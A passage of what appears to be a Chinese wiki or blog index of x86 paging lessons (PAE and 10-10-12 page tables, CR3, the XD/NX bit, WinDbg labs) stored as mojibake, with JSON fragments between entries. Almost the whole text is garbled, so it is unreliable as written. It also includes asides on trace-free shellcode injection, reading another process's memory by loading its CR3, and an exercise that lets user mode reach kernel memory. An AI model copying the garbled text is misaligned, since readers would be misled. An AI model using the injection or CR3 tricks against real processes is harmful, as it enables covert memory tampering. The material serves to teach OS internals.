0ä½ï¼ŒPä½ï¼Œè¡¨ç¤ºæœ‰æ•ˆæ— æ•ˆã€‚ 35~12ä½å­˜å‚¨çš„æ˜¯é¡µç›®å½•è¡¨ï¼ˆPDTï¼‰åŸºå€çš„é«˜24ä½ï¼Œä½12ä½ï¼ˆ11-0ä½ï¼‰è¡¥0ï¼Œå…±å 36ä½ï¼Œå³é¡µç›®å½•åŸºå€ã€‚ 11-9ä½ï¼Œç»™æ“ä½œç³»ç»Ÿç”¨ï¼Œwindowsã€linuxçˆ±æ€ä¹ˆç”¨æ€ä¹ˆç”¨ï¼Œåæ­£cpuä¸ç”¨ã€‚ PDEç»“æ„ PSä¸åŒæ—¶ï¼ŒPDEçš„ç»“æ„ä¸åŒã€‚ç¬¬7ä½æ˜¯PSä½ã€‚ PS=1ï¼Œå¤§é¡µ PS=1æ—¶ï¼ŒPDEç›´æ¥æŒ‡å‘å¤§ç‰©ç†é¡µï¼Œä¸å†æŒ‡å‘PTEã€‚ æ­¤æ—¶ï¼Œ35-21ä½æ˜¯å¤§é¡µçš„ç‰©ç†åœ°å€ï¼Œ20-0è¿™ä½21ä½æ¸…0ã€‚å› ä¸ºä½21ä½æ¸…0ï¼Œæ‰€ä»¥å¤§é¡µå¤§å°æ˜¯2MBã€‚ä»å¦ä¸€ä¸ªè§’åº¦çœ‹ï¼šçº¿æ€§åœ°å€ä½21ä½ï¼ˆ32-2-9=21ä½ï¼‰æ˜¯ç‰©ç†é¡µé¡µå†…åç§»ï¼Œå®ƒçš„å¤§å°æ˜¯2MBã€‚è¿™æ„å‘³ç€é¡µçš„å¤§å°æ˜¯2MBï¼Œä¸”éƒ½æ˜¯2MBå¯¹é½ã€‚ PATä½æ˜¯Page Attribute Tableï¼Œé¡µå±æ€§è¡¨ã€‚è¿™ä¸ªä½è·ŸCPUç›¸å…³ï¼Œä¸æ˜¯æ‰€æœ‰CPUéƒ½æ”¯æŒè¿™ä¸ªä½ï¼Œå¦‚æœä¸æ”¯æŒï¼Œå¡«0ã€‚è¿™ä¸ªä½æ˜¯é’ˆå¯¹é¡µçš„ã€‚æ‰€ä»¥å½“PS=0æ—¶ï¼ŒPDTæŒ‡å‘é¡µç›®å½•ï¼ŒPDTå°±æ²¡è¿™ä¸ªä½ã€‚ ç¬¬8ä½ï¼ŒGä½ï¼Œå› ä¸ºPS=1ï¼Œæ‰€ä»¥Gä½æœ‰æ„ä¹‰ï¼Œä¸º0æˆ–ä¸º1æœ‰ä¸åŒçš„å«ä¹‰ã€‚ PS=0ï¼Œéå¤§é¡µ å½“PS=0æ—¶ï¼Œ35-12ä½æ˜¯é¡µè¡¨åŸºå€ï¼Œä½12ä½è¡¥0ï¼Œå…±36ä½ã€‚ ç¬¬8ä½ï¼ŒGä½ï¼Œå› ä¸ºPS=0ï¼ŒGä½æ— æ„ä¹‰ï¼Œä¸º0ã€‚ PTEç»“æ„ PTEä¸­35-12æ˜¯ç‰©ç†é¡µåŸºå€,24ä½,ä½12ä½è¡¥0ã€‚ ç‰©ç†é¡µåŸºå€+12ä½çš„é¡µå†…åç§»æŒ‡å‘å…·ä½“æ•°æ® XD/NXä½ï¼ˆDEPæ•°æ®æ‰§è¡Œä¿æŠ¤ï¼‰ ä¹‹å‰æè¿‡ï¼Œæ®µçš„å±æ€§æœ‰å¯è¯»ã€å¯å†™å’Œå¯æ‰§è¡Œï¼Œä½†åœ¨10-10-12åˆ†é¡µä¸­ï¼Œé¡µçš„å±æ€§åªæœ‰å¯è¯»ï¼Œå¯å†™ã€‚ å¦‚æœé¡µæ²¡æœ‰å¯æ‰§è¡Œè¿™ä¸ªå±æ€§ï¼Œè¿™ä¼šå‡ºç°æŠŠæ•°æ®å½“ä½œä»£ç æ¥æ‰§è¡Œçš„æƒ…å†µã€‚æ¼æ´å°±æ˜¯åˆ©ç”¨äº†è¿™ä¸€ç‚¹ï¼ŒSQLæ³¨å…¥å…¶å®ä¹Ÿæ˜¯å°†ç”¨æˆ·è¾“å…¥çš„æ•°æ®å½“æˆä»£ç æ‰§è¡Œã€‚ æ¼æ´éƒ½æºäºæ•°æ®å¯æ‰§è¡Œï¼Œæ‰€ä»¥Intelä»ç¡¬ä»¶å±‚é¢ä¸Šä½œäº†ä¿æŠ¤ï¼Œåšäº†ä¸€ä¸ªä¸å¯æ‰§è¡Œä½ã€‚å½“XD=1æ—¶ï¼Œå³ä½¿è½¯ä»¶æº¢å‡ºäº†ä¹Ÿæ²¡å…³ç³»ï¼Œå³ä½¿EIPè¹¦åˆ°äº†å±é™©çš„â€œæ•°æ®åŒºâ€ï¼Œä¹Ÿæ˜¯ä¸å¯æ‰§è¡Œçš„ã€‚ XDæ ‡å¿—ä½ï¼ˆAMDä¸­ç§°ä¸ºNXï¼ŒNo Executionï¼‰ åœ¨PATåˆ†é¡µæ¨¡å¼ä¸‹ï¼ŒPDEå’ŒPTEç»“æ„ä¸­æœ€é«˜ä½éƒ½æ˜¯XD/NXä½ã€‚ å€¼ å«ä¹‰ 1 è¯´æ˜è¢«ä¿æŠ¤ã€‚å¦‚æœè¿™ä¸ªæ˜¯æ•°æ®ï¼Œä¸”è¿™ä¸ªxä½è¢«ç½®1ï¼Œåˆ™ä¼šæŠ¥å¼‚å¸¸ä¸èƒ½æ‰§è¡Œã€‚ 0 å’Œæ­£å¸¸çš„10-10-12åˆ†é¡µä¸€æ ·ã€‚ PDEå’ŒPTEä¸­XDä½æ˜¯|çš„å…³ç³»ï¼Œå…¶ä¸­ä¸€ä¸ªä¸º1ï¼Œå°±æ˜¯è¢«ä¿æŠ¤ã€‚ æ‰€ä»¥ä½ ä¹Ÿèƒ½ç†è§£ï¼šxpä¿®æ”¹åˆ†é¡µæ¨¡å¼boot.iniæ–‡ä»¶ä¸­ï¼ŒPAEæ¨¡å¼çš„å‚æ•°ä¸ºä»€ä¹ˆæ˜¯ï¼š/noexecuteäº†ã€‚ å¯ç”¨PAEæ¨¡å¼åï¼Œå¯ä»¥æ‰¾åˆ°DEPçš„é…ç½®ï¼š â€œæˆ‘çš„ç”µè„‘â€-&quot;å±æ€§&quot;æˆ–ï¼šå•å‡»â€œå¼€å§‹â€ã€â€œæ§åˆ¶é¢æ¿â€ã€â€œæ€§èƒ½å’Œç»´æŠ¤â€ï¼Œç„¶åå•å‡»â€œç³»ç»Ÿâ€ã€‚ å•å‡»â€œé«˜çº§â€é€‰é¡¹å¡ï¼Œä¹‹åå•å‡»â€œæ€§èƒ½â€ä¸‹çš„â€œè®¾ç½®â€ã€‚ å•å‡»â€œæ•°æ®æ‰§è¡Œä¿æŠ¤â€é€‰é¡¹å¡ã€‚ é»˜è®¤åªä¸ºwindowsåŸºæœ¬ç¨‹åºå’ŒæœåŠ¡å¼€å¯DEPã€‚ åœ¨ä¸Šé¢çš„2-9-9-12å®éªŒä¸­å¯ä»¥çœ‹åˆ°ï¼Œå˜é‡xçš„PTEæœ€é«˜ä½æ˜¯8ã€‚è¡¨æ˜æˆ‘ä»¬å­˜å‚¨çš„æ•°æ®â€™aâ€™ï¼Œä¸èƒ½å½“ä½œä»£ç æ‰§è¡Œã€‚ å®éªŒï¼šä½“ä¼šXDä½ å®éªŒè¿‡ç¨‹å‚è€ƒé“¾æ¥ï¼šhttps://www.cnblogs.com/wingsummer/p/15364649.htmlhttps://blog.csdn.net/Kwansy/article/details/108965196ä¹ è¯¾åç»ƒä¹  ç»™0çº¿æ€§åœ°å€æŒ‚ä¸Šç‰©ç†é¡µã€‚ ç­”æ¡ˆå…¶å®åŒã€ŠPDEã€PTEåˆæ­¥æ„Ÿå—.html#å®éªŒã€‹éƒ¨åˆ†å…ˆè§‚å¯Ÿçº¿æ€§åœ°å€0çš„æƒ…å†µæˆ‘ä»¬å…ˆåœ¨windbgä¸­è§‚å¯Ÿçº¿æ€§åœ°å€0çš„PDPEã€PDEã€PDTæƒ…å†µã€‚é€‰äº†ä¸€ä¸ªè¿›ç¨‹notepadï¼ŒæŸ¥çœ‹CR3ï¼ŒæŸ¥PDPEã€PDEã€PDTå¯ä»¥çœ‹åˆ°PTEä¸º0ï¼Œæ‰€æœ‰æ²¡æœ‰ç‰©ç†é¡µã€‚é‚£å…¶å®å’Œä¹‹å‰10-10-12çš„å®éªŒä¸€æ ·ï¼Œæˆ‘ä»¬æ‰¾ä¸€ä¸ªå¯ç”¨çš„ç‰©ç†é¡µï¼Œç„¶åå°†è¯¥ç‰©ç†é¡µçš„PTEèµ‹å€¼ç»™0çš„PTEå°±å¥½äº†ã€‚å°†ä¹‹å‰çš„ä»£ç è´´åˆ°è¿™é‡Œï¼Œæœªæ”¹åŠ¨123456789101112131415161718#include &lt;stdio.h&gt;int main(int argc, char* argv[])&#123;\tint x = 1;\tprintf(&quot;xçš„åœ°å€:%x &quot;,&amp;x); //åœ¨windbgæŒ‚èµ·ï¼Œå¾—åˆ°ç¨‹åºçš„CR3ï¼Œæ ¹æ®CR3å’Œå˜é‡xçš„åœ°å€å¾—åˆ°PTE //æŠŠçº¿æ€§åœ°å€0çš„PTEæ”¹æˆå˜é‡xçš„PTE getchar();\tprintf(&quot;å‘0åœ°å€å†™å…¥123å‰ï¼Œ0åœ°å€æ•°æ®ä¸º:%d &quot;,*(int*)0); //å‘0åœ°å€å†™å…¥æ•°æ®\t*(int*)0 = 123; //å‘0åœ°å€è¯»æ•°æ®\tprintf(&quot;å‘0åœ°å€å†™å…¥123åï¼Œ0åœ°å€æ•°æ®ä¸º:%d &quot;,*(int*)0);\treturn 0;&#125;ä¿®æ”¹çº¿æ€§åœ°å€0çš„PTEä¸ºå˜é‡xçš„PTEã€‚æ²¡æœ‰!eqæŒ‡ä»¤ï¼Œç”¨!edæ³¨æ„æ˜¯å°ç«¯åºï¼Œåˆ«ä¿®æ”¹åäº†çº¿æ€§åœ°å€0ä¿®æ”¹åï¼šhttps://blog.csdn.net/Kwansy/article/details/108965196äº” ä¿®æ”¹é¡µå±æ€§,å®ç°åº”ç”¨å±‚è¯»å†™é«˜2Gå†…å­˜åœ°å€ã€‚ ç­”æ¡ˆhttps://blog.csdn.net/Kwansy/article/details/108965196å…­ã€ é€†å‘åˆ†æMmlsAddressValidå‡½æ•°ï¼Œæ‰¾åˆ°PAEåˆ†é¡µæ¨¡å¼ä¸‹é¡µç›®å½•è¡¨ã€é¡µè¡¨åŸºå€ã€‚ ç­”æ¡ˆhttps://blog.csdn.net/Kwansy/article/details/108965196ä¸ƒã€ ç¼–å†™ä»£ç å®ç°ç¬¬äºŒé¢˜ã€‚ ç­”æ¡ˆhttps://blog.csdn.net/Kwansy/article/details/108965196å…«ã€ é¡µç›®å½•è¡¨åŸºåœ°å’Œé¡µè¡¨åŸºå€"},{"title":"10-10-12åˆ†é¡µ","path":"/wiki/Protected_Mode/10-10-12åˆ†é¡µ.html","content":"å‰è¨€ åœ¨å®æ¨¡å¼ä¸‹ï¼Œçº¿æ€§åœ°å€å°±æ˜¯çœŸæ­£çš„ç‰©ç†åœ°å€ã€‚ï¼ˆè®¡ç®—æœºåˆšé€šç”µå¯åŠ¨å°±æ˜¯å®æ¨¡å¼å¯åŠ¨ï¼Œç„¶åè½¬åˆ°ä¿æŠ¤æ¨¡å¼ï¼‰ã€‚ åœ¨ä¿æŠ¤æ¨¡å¼ä¸‹ï¼ŒCPUå¦‚ä½•å°†çº¿æ€§åœ°å€è½¬æ¢ä¸ºç‰©ç†åœ°å€ï¼Ÿæ¯”å¦‚æˆ‘ä»¬æ‰§è¡Œmov eax,ds:[0x12345678]è¿™å¥æ±‡ç¼–æŒ‡ä»¤ã€‚CPUä¼šç”¨ds.base+0x12345678è¿™ä¸ªçº¿æ€§åœ°å€ï¼Œå…ˆæŸ¥è¯¢TLBå’Œç¼“å­˜æœ‰æ²¡æœ‰ï¼Œæœ‰çš„è¯ç›´æ¥å–å‡ºæ¥è¿”å›ï¼›å¦‚æœæ²¡æœ‰ï¼Œç»è¿‡MMUï¼ˆå†…å­˜ç®¡ç†å•å…ƒï¼‰ï¼Œæ ¹æ®ç›®å‰ä½¿ç”¨çš„åˆ†é¡µæ¨¡å¼ï¼Œç»è¿‡è½¬æ¢å¤„ç†å¾—åˆ°ç‰©ç†åœ°å€ï¼Œå–å‡ºæ•°æ®è¿”å›ã€‚ æ¦‚å¿µï¼šæœ‰æ•ˆåœ°å€ã€çº¿æ€§åœ°å€ã€ç‰©ç†åœ°å€ 1mov eax,ds:[0x12345678] æœ‰æ•ˆåœ°å€ï¼š0x12345678 çº¿æ€§åœ°å€ï¼šds.base+0x12345678 ç‰©ç†åœ°å€ï¼šCPUç”±çº¿æ€§åœ°å€è½¬æ¢åˆ°å†…å­˜ä¸Šçš„çœŸæ­£çš„åœ°å€ åœ¨32ä½ä¸­ï¼Œé™¤äº†fsï¼Œå…¶ä»–æ®µå¯„å­˜å™¨çš„baseéƒ½æ˜¯0ï¼Œæ‰€æœ‰é€šå¸¸æƒ…å†µä¸‹æœ‰æ•ˆåœ°å€=çº¿æ€§åœ°å€ åˆ†é¡µ å­¦ç¼–ç¨‹æ—¶å¬è¿‡ä¸€ä¸ªæ¦‚å¿µå«ï¼šæ¯ä¸ªè¿›ç¨‹éƒ½æœ‰è‡ªå·±çš„4GBè¿›ç¨‹ç©ºé—´ã€‚è¿™ä¸ªå†…å­˜ç©ºé—´æ˜¯å‡çš„ï¼Œå¹¶ä¸æ˜¯å®é™…çš„å†…å­˜ç©ºé—´ã€‚ CPUè´Ÿè´£å°†è¿™ä¸ªçº¿æ€§åœ°å€è½¬æ¢ä¸ºç‰©ç†åœ°å€ã€‚ åœ¨x86æ¶æ„ä¸­è½¬æ¢çš„æ–¹å¼æœ‰ä¸¤ç§ï¼š10-10-12åˆ†é¡µæ–¹å¼å’Œ2-9-9-12åˆ†é¡µæ–¹å¼ï¼ˆPAEæ¨¡å¼ï¼‰ã€‚ å­¦ä¹ è·¯çº¿ï¼š10-10-12åˆ†é¡µ-&gt;2-9-9-12åˆ†é¡µ-&gt;64ä½çš„åˆ†é¡µæ¨¡å¼ã€‚ ç‰©ç†å†…å­˜ä¸æ˜¯å†…å­˜æ¡ï¼Œå®ƒæ˜¯æ“ä½œç³»ç»ŸæŠ½è±¡å‡ºæ¥çš„å†…å­˜ã€‚å®ƒå’ŒçœŸæ­£çš„å†…å­˜æ¡ä¹‹é—´è¿˜æœ‰ä¸€å±‚ç”µè·¯è½¬æ¢ï¼Œæˆ‘ä»¬è®²åˆ°ç‰©ç†å†…å­˜è¿™ä¸€å±‚å°±å¤Ÿäº†ã€‚çŸ¥é“ç‰©ç†å†…å­˜å’ŒçœŸæ­£çš„å†…å­˜æ¡ä¹‹é—´æ˜¯ä¸€ä¸€å¯¹åº”çš„å…³ç³»å°±å¤Ÿäº†ã€‚ ç‰©ç†å†…å­˜å¤§å°å’ŒçœŸå®å†…å­˜å¤§å°ä¸€æ ·ã€‚ é¢˜å¤–è¯ï¼šhookè‡ªå·±ä¹Ÿèƒ½hookåˆ°ç›®æ ‡è¿›ç¨‹ç³»ç»Ÿdllåœ¨ç‰©ç†å†…å­˜ï¼Œç»™æ¯ä¸ªè¿›ç¨‹éƒ½æ˜ å°„äº†ä¸€ä¸ªçº¿æ€§åœ°å€ã€‚ç›´æ¥hookè‡ªå·±è¿›ç¨‹ï¼Œä¹Ÿèƒ½hookåˆ°ç›®æ ‡è¿›ç¨‹çš„dllï¼Œåªæ˜¯å®ç°ç»†èŠ‚ç°åœ¨ä½ å¼„ä¸ä¼šã€‚ CR3 æ¯ä¸ªè¿›ç¨‹éƒ½æœ‰ä¸€ä¸ªCR3ï¼ŒCR3é‡Œé¢æ”¾çš„æ˜¯ä¸€ä¸ªçœŸæ­£çš„ç‰©ç†åœ°å€ï¼Œå®ƒæŒ‡å‘äº†ä¸€çº§ç›®å½•ï¼Œä»ä¸€çº§ç›®å½•æ‰¾åˆ°äºŒçº§ç›®å½•ï¼Œå†ä»äºŒçº§ç›®å½•æ‰¾åˆ°æœ€ç»ˆçš„ç‰©ç†åœ°å€ã€‚ CR3æŒ‡å‘çš„ç‰©ç†é¡µå¤§å°æ˜¯4kbï¼Œ4096å­—èŠ‚ã€‚ å‡†ç¡®çš„è¯´æ˜¯æ¯ä¸ªè¿›ç¨‹éƒ½æœ‰ä¸€ä¸ªCR3çš„å€¼ã€‚ CR3æ˜¯ä¸ªå¯„å­˜å™¨ï¼Œ1ä¸ªCPUä¸€å¥—å¯„å­˜å™¨ï¼Œ1ä¸ªæ ¸1ä¸ªCR3ã€‚ 1ä¸ªæ ¸å¯ä»¥è·‘å¤šä¸ªè¿›ç¨‹ã€‚ å¤šä¸ªè¿›ç¨‹ç”¨çš„æ˜¯åŒä¸€ä¸ªCR3å¯„å­˜å™¨ï¼Œåªä¸è¿‡ä¸åŒè¿›ç¨‹CR3çš„å€¼ä¸åŒã€‚ æ¨å¯¼è¿‡ç¨‹ï¼šä¸ºä»€ä¹ˆCR3å­˜çš„æ˜¯ç‰©ç†åœ°å€ï¼Œä¸èƒ½æ˜¯çº¿æ€§åœ°å€å—ï¼Ÿåœ¨ä¿æŠ¤æ¨¡å¼ä¸‹ï¼Œå‡è®¾CPUæ‹¿åˆ°äº†çº¿æ€§åœ°å€0x12345678ï¼Œè¦å»æ‰¾çœŸæ­£çš„ç‰©ç†åœ°å€ã€‚æ€ä¹ˆæ‰¾ï¼Ÿä»å“ªé‡Œæ‰¾èµ·ï¼Ÿå¦‚æœè¿™æ—¶ä½ åˆç»™äº†ä¸€ä¸ªçº¿æ€§åœ°å€æ¯”å¦‚[45678]ï¼ŒCPUè¿˜æ˜¯æ²¡æ³•æ‰¾ç‰©ç†åœ°å€å‘€ï¼Œé™·å…¥æ­»å¾ªç¯äº†ã€‚æ‰€ä»¥ä½ å¿…é¡»ç»™ä¸€ä¸ªä¸ç”¨æŸ¥è¡¨å°±èƒ½ç”¨çš„åœ°å€ï¼Œå³ç‰©ç†åœ°å€ã€‚æ‰€ä»¥CR3å­˜çš„æ˜¯çœŸå®çš„ç‰©ç†åœ°å€ã€‚ CR3æ˜¯æ‰€æœ‰å¯„å­˜å™¨ä¸­å”¯ä¸€ä¸€ä¸ªå­˜å‚¨ç‰©ç†åœ°å€çš„å¯„å­˜å™¨ï¼Œå…¶ä»–å¯„å­˜å™¨å­˜çš„éƒ½æ˜¯çº¿æ€§åœ°å€ã€‚ æ¯ä¸ªè¿›ç¨‹éƒ½æœ‰è‡ªå·±çš„CR3ï¼Œéƒ½æœ‰è‡ªå·±çš„è¡¨ã€‚ è¿›ç¨‹çš„æ¦‚å¿µå°±æ˜¯ä¸ºäº†æä¾›CR3ã€‚å‡è®¾ä¸€ä¸ªè¿›ç¨‹åˆ›å»ºäº†10ä¸ªçº¿ç¨‹ï¼Œè¿™10ä¸ªçº¿ç¨‹å…±ç”¨ä¸€ä¸ªè¡¨ã€‚æ¯ä¸ªçº¿ç¨‹éƒ½èƒ½è£…ä¸€ä¸ªCR3ï¼Œä½†CR3æ˜¯ä¸€æ ·çš„ã€‚ æ‹“å±•ï¼šCPUã€æ“ä½œç³»ç»Ÿã€é¡µCPUè¯´ï¼Œåœ¨ä¿æŠ¤æ¨¡å¼ï¼Œæˆ‘é€šè¿‡CR3-&gt;ç¬¬ä¸€çº§-&gt;ç¬¬äºŒçº§çš„æ–¹å¼æ¥æ‰¾ç‰©ç†é¡µã€‚æ“ä½œç³»ç»Ÿè¯´ï¼Œæ—¢ç„¶ä½ è¦è¿™æ ·æ‰¾ï¼Œé‚£æˆ‘æä¾›æ¯çº§é¡µçš„å…·ä½“å†…å®¹ï¼Œä½ æ¥æ‰¾ã€‚CPUç®¡ä¸ç€é¡µæœ‰æ²¡æœ‰å€¼ï¼Œå…·ä½“æ˜¯å•¥å€¼ã€‚CPUåªç®¡æŸ¥ã€‚æ‹“å±•ï¼šæ¢é¡µæ˜¯CPUè¿˜æ˜¯æ“ä½œç³»ç»Ÿåšçš„æ¢é¡µï¼Œæ“ä½œç³»ç»Ÿå’ŒCPUåˆä¼™åšçš„ã€‚è¯»ã€å†™æ˜¯æ“ä½œç³»ç»Ÿåšçš„ï¼Œä»€ä¹ˆæ—¶å€™è¯»ï¼Œä»€ä¹ˆæ—¶å€™å†™ï¼Œæ˜¯CPUåšçš„ é¢˜å¤–è¯ï¼šæ³¨å…¥æœ€å¥½çš„æ³¨å…¥å½¢å¼ï¼Œshellcodeæ³¨å…¥ã€‚æ€è€ƒè¿‡ç¨‹ï¼šæ³¨å…¥çš„æœ¬è´¨å°±æ˜¯æŠŠè‡ªå·±çš„dllæ”¾åˆ°åˆ«äººçš„è¿›ç¨‹ç©ºé—´ï¼Œè®©è‡ªå·±çš„ç¨‹åºåœ¨åˆ«äººçš„è¿›ç¨‹ç©ºé—´èƒ½æ‰§è¡Œã€‚é‚£dllçš„æœ¬è´¨æ˜¯ä»€ä¹ˆï¼Ÿä¸å°±æ˜¯ä¸€å †æ•°æ®ã€‚é‚£æˆ‘ç›´æ¥å‘ç›®æ ‡è¿›ç¨‹æ¥ä¸ªè¿œç¨‹å†…å­˜å†™å…¥ï¼Œä¸€æ‰§è¡Œå®Œå°±æŠ¹æ‰ã€‚è¿™æ ·æ²¡ä»€ä¹ˆç—•è¿¹ã€‚ç›‘æ§ä¸è®©å†™ï¼Œé‚£æ˜¯å¦ä¸€ä¸ªè¯é¢˜ã€‚é¢˜å¤–è¯ï¼šè¿œç¨‹è°ƒç”¨ï¼Œè¿›ç¨‹æŒ‚é è¿œç¨‹è°ƒç”¨ï¼šä½ åœ¨Aè¿›ç¨‹å¯åŠ¨äº†ä¸€ä¸ªçº¿ç¨‹ï¼Œè°ƒç”¨Aè¿›ç¨‹çš„å‡½æ•°ã€‚è¿›ç¨‹æŒ‚é ï¼šæŠŠåˆ«çš„è¿›ç¨‹çš„CR3æ”¹æˆè‡ªå·±çš„CR3ï¼Œä½ ç°åœ¨çš„çº¿ç¨‹ä¾é™„äºä»–äººçš„è¿›ç¨‹ç©ºé—´ã€‚ä»£ç æ‰§è¡Œæ—¶ç”¨çš„æ•°æ®æ˜¯äººå®¶çš„ã€‚é¢˜å¤–è¯ï¼šä»€ä¹ˆæ—¶å€™èƒ½åˆ©ç”¨åˆ°CR3å‡è®¾è¿™é‡Œæœ‰è¿›ç¨‹Aå’Œè¿›ç¨‹Bï¼ŒAè¿›ç¨‹æƒ³è¯»Bè¿›ç¨‹[12345678]åœ°å€çš„æ•°æ®è¿›ç¨‹Aå†™ä»£ç 12mov cr3,Bcr3mov x,[12345678]åªè¦æ‹¿åˆ°Bè¿›ç¨‹çš„CR3ï¼Œæ­¤æ—¶è¯»çš„å°±æ˜¯è¿›ç¨‹Bçš„çº¿æ€§åœ°å€ã€‚è·¨è¿›ç¨‹å†…å­˜è¯»å†™ã€‚ä½†æ˜¯xä¹Ÿä¸æ˜¯è‡ªå·±çš„xäº†ã€‚æœ‰åŠæ³•çš„ã€‚æ€ä¹ˆå¾—åˆ°CR3ï¼Ÿåœ¨EPROCESSç»“æ„ä½“ä¸­ï¼Œåé¢è®²ã€‚ä¸æ–­åˆ‡CR3ä¼šä¸ä¼šæŒ‚ï¼Ÿæ“ä½œç³»ç»Ÿä¹Ÿåœ¨ä¸åœåœ°åˆ‡ï¼ŒæŒ‚ä¸æŒ‚å–å†³äºä½ æœ‰æ²¡æ­£ç¡®çš„åˆ‡æ¢ã€‚è¿™ç§å½¢å¼æ˜¯ä¸æ˜¯é˜²ä¸ä½ï¼Ÿé€šå¸¸é˜²æ­¢å…¶ä»–è¿›ç¨‹è¯»å†™æˆ‘è¿›ç¨‹çš„å†…å­˜å°±æ˜¯ç»™å†…æ ¸å‡½æ•°æŒ‚é’©å­ï¼Œä½†å¦‚æœè¿™ä¸ªä»£ç æœ¬èº«æ˜¯æˆ‘è‡ªå·±å†™çš„ï¼Œå°±é˜²ä¸äº†äº†ã€‚å¦‚ä½•é˜²å®ˆï¼Ÿæˆ‘ç°åœ¨ä»€ä¹ˆéƒ½ä¸è¦ï¼Œåªè¦ä¸€ä¸ªCR3ï¼Œæˆ‘ä¹Ÿä¸ç”¨æ“ä½œç³»ç»Ÿæä¾›çš„apiï¼Œå°±èƒ½è¯»ä½ çš„å†…å­˜ã€‚é‚£æ€ä¹ˆä¸è®©ä½ å¾—åˆ°æˆ‘çš„CR3å‘¢ï¼Ÿæ“ä½œç³»ç»Ÿèƒ½è¯»åˆ°CR3ï¼Œæˆ‘å°±èƒ½è¯»ï¼Ÿä½ èƒ½ä¸è®©æ“ä½œç³»ç»Ÿè¯»ï¼Ÿæ— è§£ã€‚åˆ«çš„è§’åº¦ï¼šå¯ä»¥ç›‘è§†æ‰€æœ‰è¿›ç¨‹çš„CR3ï¼Œçœ‹æ˜¯å¦æœ‰ç›¸åŒçš„ã€‚ 10-10-12åˆ†é¡µç®€ä»‹ åœ¨10-10-12åˆ†é¡µæ¨¡å¼ä¸‹ï¼Œä¸€ä¸ªçº¿æ€§åœ°å€åˆ†ä¸º3éƒ¨åˆ†ï¼ˆ32ä½ç³»ç»Ÿçº¿æ€§åœ°å€æ˜¯32ä½çš„å˜›ï¼‰: ï¼ˆ10ä½ã€10ä½ã€12ä½ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆå«10-10-12åˆ†é¡µçš„åŸå› ã€‚ï¼‰ CPUæŒ‰æ¯é¡µ4KBï¼ˆè¿˜æœ‰å¤§é¡µ4Mï¼Œè¿™é‡Œå…ˆä¸ç®¡ï¼‰å¤§å°è¿›è¡Œç®¡ç†ã€‚ ä¸€çº§ç›®å½•ã€äºŒçº§ç›®å½•é‡Œçš„æ¯ä¸€é¡¹æ˜¯4ä¸ªå­—èŠ‚ï¼ˆ32ä½ä¸‹åœ°å€å®½åº¦4å­—èŠ‚ï¼‰ã€‚ ç¬¬1ä¸ª10ä½å°±æ˜¯çœ‹åœ¨ç¬¬ä¸€çº§ç›®å½•çš„å“ªä¸ªä½ç½®ã€‚ ç¬¬2ä¸ª10ä½å°±æ˜¯çœ‹åœ¨ç¬¬äºŒçº§ç›®å½•çš„å“ªä¸ªä½ç½®ã€‚ ç¬¬3ä¸ªï¼Œ12ï¼ŒæŒ‡çš„æ˜¯è¦æ‰¾çš„æ•°æ®åœ¨ç‰©ç†é¡µçš„å“ªä¸ªä½ç½®ã€‚ æ‰€ä»¥ï¼Œå½“æˆ‘ä»¬æ‹¿åˆ°ä¸€ä¸ªçº¿æ€§åœ°å€ï¼Œè¦å»æ‰¾ç‰©ç†åœ°å€ï¼Œå°†çº¿æ€§åœ°å€æ‹†æˆ10-10-12åï¼š CR3+æ‹†åˆ†åçš„ç¬¬ä¸€ä¸ª10, Ã—4ï¼Œæ‰¾åˆ°äºŒçº§ç›®å½•åœ°å€ äºŒçº§ç›®å½•åœ°å€+æ‹†åˆ†åçš„ç¬¬äºŒä¸ª10, Ã—4åï¼Œæ‰¾åˆ°ç‰©ç†é¡µé¦–åœ°å€ ç‰©ç†é¡µé¦–åœ°å€+12ä½ï¼ˆåç§»ï¼‰ï¼Œå¾—åˆ°çœŸæ­£çš„ç‰©ç†åœ°å€ æ‹†åˆ†å¾—åˆ°çš„10ä¸ºç´¢å¼•ï¼Œ32ä½ä¸‹åœ°å€å®½åº¦4å­—èŠ‚ï¼Œæ‰€ä»¥éœ€è¦Ã—4ã€‚ å¾—åˆ°çš„12ä¸ºåç§»ï¼Œæ— éœ€Ã—4 ç™½çš®ä¹¦ä¸­çº¿æ€§åœ°å€åˆ°ç‰©ç†åœ°å€çš„å›¾ å®éªŒï¼šé€šè¿‡æŸ¥æ‰¾notepadè¿›ç¨‹ä¸­çš„å­—ç¬¦ä¸²åœ¨ç‰©ç†å†…å­˜çš„ä½ç½®åˆæ­¥æ„Ÿå—10-10-12åˆ†é¡µ winxpè®¾ç½®åˆ†é¡µæ–¹å¼ xpç³»ç»Ÿé»˜è®¤ä¸º2-9-9-12åˆ†é¡µï¼Œæˆ‘ä»¬ä¿®æ”¹ä¸º10-10-12åˆ†é¡µã€‚ æ‰“å¼€C:\\boot.intæ–‡ä»¶ï¼ˆçœ‹ä¸åˆ°å°±è¦æ‰“å¼€éšè—æ–‡ä»¶ï¼‰ï¼š C:\\boot.int123456[boot loader]timeout=30default=multi(0)disk(0)rdisk(0)partition(1)\\WINDOWS[operating systems]multi(0)disk(0)rdisk(0)partition(1)\\WINDOWS=&quot;Microsoft Windows XP Professional&quot; /noexecute=optin /fastdetectmulti(0)disk(0)rdisk(0)partition(1)\\WINDOWS=&quot;debug&quot; /noexecute=optin /fastdetect /debug /debugport=com2 æ”¹è°ƒè¯•é‚£è¡Œï¼Œå°†noexecuteæ”¹æˆexecuteï¼š C:\\boot.int123456[boot loader]timeout=30default=multi(0)disk(0)rdisk(0)partition(1)\\WINDOWS[operating systems]multi(0)disk(0)rdisk(0)partition(1)\\WINDOWS=&quot;Microsoft Windows XP Professional&quot; /noexecute=optin /fastdetectmulti(0)disk(0)rdisk(0)partition(1)\\WINDOWS=&quot;debug&quot; /execute=optin /fastdetect /debug /debugport=com2 iniæ–‡ä»¶ åˆ†é¡µæ¨¡å¼ noexecute 2-9-9-12åˆ†é¡µ execute 10-10-12åˆ†é¡µ é‡å¯ç”Ÿæ•ˆï¼Œé€‰è°ƒè¯•æ¨¡å¼ï¼ŒæŒ‚windbgè°ƒè¯•å™¨ï¼Œå’Œä¹‹å‰çš„ä¸€æ · Win7~11è®¾ç½®åˆ†é¡µæ–¹å¼é»˜è®¤ä¸º2-9-9-12åˆ†é¡µæ¨¡å¼ï¼ˆPAEæ¨¡å¼ï¼‰ï¼Œä½¿ç”¨å·¥å…·EasyBCDå¿«æ·ä¿®æ”¹å¯åŠ¨å¼•å¯¼å±æ€§ã€‚ 